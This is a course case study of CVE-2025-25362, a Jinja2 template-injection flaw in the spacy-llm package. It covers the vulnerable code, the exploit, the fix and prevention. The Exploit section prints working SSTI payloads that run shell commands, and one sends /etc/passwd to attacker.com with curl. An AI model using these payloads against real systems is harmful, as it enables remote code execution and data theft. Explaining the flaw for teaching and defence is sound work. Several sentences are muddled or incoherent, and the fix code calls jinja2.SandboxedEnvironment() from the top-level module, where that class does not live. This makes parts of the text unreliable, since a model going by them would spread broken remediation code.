# LLM Plugin Injection

## Introduction. 
CVE-2025-25362 is a major security vulnerability on spacy-llm, a Python package from Explosion AI for injecting Large Language Models (LLMs) into spaCy's natural language processing pipelines. The module used template programming to generate prompts for LLMs, enabling the developer to practice performing NLP tasks such as text summary, classification, or entity identification without interacting with the large datasets fed into the LLMs. This vulnerability is a kind of Server-Side Template Injection (SSTI) in which an untrusted input with hidden instructions is used to alter a language model by processing templates. It also may be exploited to allow harmful actors to inject input that violates system rules, since template engines must process specially made syntax that can be interpreted as code, which can thus produce data loss, unauthorized access and remote execution. CVE-2025-25362 permits remote code execution in the template processing mechanism through Server-Side Template Injection (SSTI). By inserting crafted payloads into the template field they exploit this ability and run arbitrary code on systems for affected versions of spacy-llm.

## Software  
**Name:** spacy-llm.  
**Language:** Python.  
**URL:** https://github.com/explosion/spacy-llm

## Weakness

**CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine**

This can occur when a software system deploys a template engine to dynamically generate content while ignoring or not correctly sanitizing and sandboxing user-controlled input submitted by a template engine. Template engines like Jinja2 combine static templates and dynamically developed data, using specific syntax (`{{ }}` and `{% %}`) to deal with phrases and attributes (data) generated in the text. In a situation where untrusted input is permitted to run the template itself, the attacker can add arbitrary template directives that would execute, eventually causing SSTI. That vulnerability manifests itself because template engines provide powerful features to access the underlying functionality of a language. Jinja2 calls the default `Environment()` class, which has access to the reflection mechanisms of the Python language and has built-in functions, but, being a generic class, `SandboxedEnvironment()` isn't used. Without `SandboxedEnvironment()`, any attacker manipulating template content can hijack template code to bypass the desired rendering context and gain access to malicious features. An attacker might use template code injected to get into built-in functions and OS code via Python's object introspection, for example.

```python
# Generic vulnerable code  
import jinja2

# Using unsandboxed environment makes it vulnerable
environment = jinja2.Environment()
user_controlled_template = request.get_parameter("template")
template = environment.from_string(user_controlled_template)
output = template.render(data=some_data)
```

So an attacker could use the following template payload to run system commands:

```
{{''.__class__.__mro__[1].__subclasses__()[404]('os').popen('whoami').read()}}
```

This uses Python's object-oriented framework as a framework to move from the string object to the OS module by means of Python's OS module shell in order to execute system commands. The sandboxed environment allows a properly secure implementation to implement a well-meaning operation:

```python
# sandboxed environment makes it secure
environment = jinja2.SandboxedEnvironment()
template = environment.from_string(user_controlled_template)
output = template.render(data=some_data)
```

## Vulnerability

**CVE-2025-25362**

spacy-llm is a Python package that takes Large Language Models (LLMs) and combines them with spaCy, a popular natural language processing library. The package has a modular system for rapid prototyping and prompt generation which developers can use to utilize LLMs on tasks such as summarizing and extracting information or text classification without their needing any training data. spacy-llm uses the Jinja2 templating engine, which generates prompts on the fly that developers can manipulate to format text before feeding it to LLMs. That vulnerability occurs as early as in spacy-llm version 0.7.2, where user-defined template strings are passed through Jinja2's default `Environment()` class with no effective sandbox. This provides the attackers with another hook and a way to inject malicious Jinja2 expressions into the template field and execute arbitrary Python code on the server.

```python
# vulnerable code
def generate_prompts(
    ...
    environment = jinja2.Environment()
    _template = environment.from_string(self._template)
    ...

def render_template(shard: Doc, i_shard: int, i_doc: int, n_shards: int) -> str:
    ...
    return _template.render(
        text=shard.text,
        prompt_examples=self._prompt_examples,
        **self._get_prompt_data(shard, i_shard, i_doc, n_shards),
    )
```

The code utilizes the default `Environment()` class to create a Jinja2 environment. This is the root cause, because there is no limit on introspection or built-in Python functionality accessible through the default environment. The structure `self._template` (as spacy-llm modification takes care of this) calls `from_string()` and creates a Jinja2 template object. The code parses the template string and prepares it for rendering. The `render_template` method returns the template with its input text, prompt examples and other data fields. The `render()` method executes any expressions with Jinja2 in the template string. The third limitation of spacy-llm is that it is insecure under the constraints imposed by the Python environment (open access and runtime constraints). However, since the environment is not sandboxed, any malicious Jinja2 expressions written in the template will run with full access to Python's runtime capabilities. This is particularly dangerous because spacy-llm supports user-mandated templates through configuration dictionaries.

Although the template field is designed to contain natural language instructions for the LLM, without adequate sandboxing it becomes a vector for execution. In Jinja2, the built-in `Environment()` class gives full access to Python's object model and built-in functions. This is applicable for legitimate templating purposes, but the consequences are severe when executing untrusted source. You should also go with `jinja2.SandboxedEnvironment()` in a manner that prevents injection attacks with injectable template. Because of the sandbox nature of the environment, it allows simple template functionality like variable substitution and control flow but prevents attempts to gain access to internals in Python or to run arbitrary bits of code.

## Exploit

**CAPEC-242: Code Injection**

This vulnerability is used to exploit the ability of an adversary to control or affect the template field of the spacy-llm configuration. The application can be affected if it inputs LLM-based prompts to the application prior to user input, loads templates from user-controlled documents, or configures spacy-llm pipelines with API or web interfaces. The attacker can inject Jinja2 expressions which exploit Python's object introspection to perform arbitrary code once they obtain all content in the template. The exploit relies on using Python's object model and Jinja2 template syntax. An attacker uses double-brace syntax `{{ }}` to generate payload with injected Python expressions. The payload traverses the object hierarchy of Python to access its own internal objects such as `__import__`, to read in functionality for importation, modules such as `os`, and to run command execution of the entire system, but these functions like `__import__` are found directly within Python itself. What you would get from a working exploit payload could you find?

```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

This payload executes as follows: (1) access the `self` object in Jinja2 context, (2) navigate to `__init__` to access the initialization method, (3) access `__globals__` to access the global namespace, (4) access `__builtins__` to use the built-in functions in Python, (5) use `__import__` to dynamically load the `os` module, (6) call `popen('id')` to execute the system command `id`, and (7) call `read()` to capture the command output. Thus, when this template is fed to the vulnerable code, the command runs and returns system context. An attacker can set up the spacy-llm to store this payload in the following code:

```python
config = {
    "task": {
        "@llm_tasks": "spacy.Summarization.v1",
        "max_n_words": 100,
        "template": "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    },
    "model": {"@llm_models": "spacy.Dolly.v1", "name": "dolly-v2-3b"},
}
```

In such configuration, when the application receives the application and generates prompts for the code generation and input, it renders the malicious template on Jinja2's unsandboxed environment, and the `id` command executes in a session server. And the output the command gives us is then included in the render prompt, thus validating that you implemented the code successfully. A more destructive payload can be designed for varying malicious intent. An attacker might, for instance, create files on the system:

```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('touch /tmp/pwned').read()}}
```

The result is that sensitive files are read into external servers:

```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('curl -X POST -d @/etc/passwd http://attacker.com').read()}}
```

The consequences of successfully exploiting this vulnerability include complete server compromise via remote code execution. An attacker can steal any data that's potentially sensitive such as key point of entry to the API, password credentials, or proprietary models; install backdoors facilitating continuous access to the API; spoof LLM responses to poison other systems downstream of the system; cause denial of service by degrading network resources; or simply move to other systems in the network. Since spacy-llm is often used in production AI applications handling sensitive data, the effect can be severe for the entire enterprise system not only the immediate one, but also the customer data, intellectual property, and stability of AI systems to deliver the services that they are running.

## Fix

spacy-llm version 0.7.3 replaced Jinja2's default `Environment()` class with `SandboxedEnvironment()`. This is to restrict access of the template engine to the Python internal objects and built-in functions so the attackers cannot use template injection to execute arbitrary code.

```diff
def generate_prompts(
    ...
-    environment = jinja2.Environment()
+    environment = jinja2.SandboxedEnvironment()
    _template = environment.from_string(self._template)
    ...
```

```python
def render_template(shard: Doc, i_shard: int, i_doc: int, n_shards: int) -> str:
    ...
    return _template.render(
        text=shard.text,
        prompt_examples=self._prompt_examples,
        **self._get_prompt_data(shard, i_shard, i_doc, n_shards),
    )
```

That critical change happens where `jinja2.Environment()` got replaced by `jinja2.SandboxedEnvironment()`. That is a one-line change that changes the way the template engine reads and processes an expression. If that only single-line change in this pattern changes, the syntax of this transformation fundamentally alters the way the template engine will respond to an expression. The sandboxed environment intercepts attempts to gain access to malicious attributes and methods, preventing users from accessing Python's introspection functions like `__init__`, `__globals__`, and `__builtins__`. If an attacker tries to load a bad payload, as follows: `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}`, this sandboxed environment grabs restricted attributes, raises a `SecurityError`, and prevents code execution. While `SandboxedEnvironment()` still allows for all legitimate templating operations to execute, the rest of the code has not changed. Standard template variables, control structures `{% if %}` and filters (`{% for %}`, etc.) work. The fix only limits access to the dangerous Python internals and not to rendering templates with user data as intended.

## Prevention. 
At the software development lifecycle you should have a system to control server-side template injection vulnerabilities. Mandatory coding standards can be enacted in organizations against unsandboxed template environments, and automated linting tools like Semgrep or Bandit should be setup to identify any use of `jinja2.Environment()` and demand `jinja2.SandboxedEnvironment()` instead. Within CI/CD pipelines, these checks should be implemented as mandatory build gates to prevent vulnerable code from being merged. For this spacy-llm application, such automated static analysis checks would have indicated early that the Jinja2 environment had been the default for the entirety of development. 
Applications need to be built in such a way that user input only includes template definitions, and never allows any arbitrary template strings to be thrown in. Only permit users to enter pre-approved template identifiers and provide data values for rendering. You can also have template-specific checklists in security-based code reviews asking questions "Can user input decide what's on the template?" and verify sandbox usage. For automated test suites, SSTI test payloads must be embedded. Template-rendering functionality against potentially malicious inputs in the form of `{{7*7}}` or `{{''.__class__}}` would have identified spacy-llm's weakness before it was released. 
Automated dependency scanning tools (pip-audit, Dependabot, Snyk) should be used, to check for announced CVEs and trigger immediate patching processes. As was the case for CVE-2025-25362, organizations should have procedures to inform them of vulnerabilities released when they are published and to apply patches to them within 24-48 hours of disclosure. Static Application Security Testing (SAST) tools could be configured with any rule that detects template injection patterns. For Jinja2-based Python applications, the rules should explicitly search for instantiation of `Environment()`, but avoid sandboxing and alert the developer, allowing for manual inspection. One can add the use-case of Dynamic Application Security Testing (DAST) to these scenarios by testing running applications against common payloads of SSTI tools to ensure that sandboxing is successful. Through strong, tool driven frameworks, secure manipulation of templates becomes the default operation, whereas single dev vigilance is not sufficient.

## Conclusion. 

CVE-2025-25362 is an example of how traditional web application vulnerabilities can be leveraged at modern AI and machine learning infrastructures. The spacy-llm template server-side injection vulnerability was introduced using Jinja2's unsandboxed `Environment()` class in order to deal with user-defined template strings that are used to generate the prompts of the LLM. Called CWE-1336, this vulnerability allowed hackers to leverage Python's ability to introspect objects and execute arbitrary code on the server, which had the opportunity to execute code remotely, steal the information and exploit the end-to-end compromise that was at play throughout the system. The vulnerability affected spacy-llm versions 0.7.2 and older. It affected an estimated 205,000 downloads in six months time. The version 0.7.3 release fixes this problem by replacing the default `Environment()` function with `SandboxedEnvironment()`, it makes sure that harmful Python internals are blocked at the same time as maintaining proper templating functionality. This case study highlights the need to apply sandboxed execution environments, examine template engine configurations thoroughly, and understand the possible dangers in third party library defaults. This is exactly what user input should do, always with these types of tools and techniques in mind. User-controlled templates used with spacy-llm or similar libraries should make sure that they have up-to-date patched edition of their coding or follow secure coding principles to prevent an injection of template.

## References.  
- **spacy-llm Project Repository:**  
  https://github.com/explosion/spacy-llm  

- **CVE-2025-25362 Entry:**  
  https://nvd.nist.gov/vuln/detail/CVE-2025-25362  

- **CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine:**  
  https://cwe.mitre.org/data/definitions/1336.html  

- **CAPEC-242: Code Injection:**  
  https://capec.mitre.org/data/definitions/242.html  

- **GitHub Security Advisory GHSA-793v-gxfp-9q9h:**  
  https://github.com/advisories/GHSA-793v-gxfp-9q9h  

- **spacy-llm Code Commit to Fix Issue:**  
  https://github.com/explosion/spacy-llm/commit/8bde0490cc1e9de9dd2e84480b7b5cd18a94d739  

- **Jinja2 Documentation - Security Considerations:**  
  https://jinja.palletsprojects.com/en/3.1.x/sandbox/#security-considerations  

- **Jinja2 API Documentation - Environment Classes:**  
  https://jinja.palletsprojects.com/en/3.1.x/api/#jinja2.Environment  

## Contributions. 
This case study was made in accordance with a course taught by David A Wheeler 
Originally created by Tanuja Konda Reddy
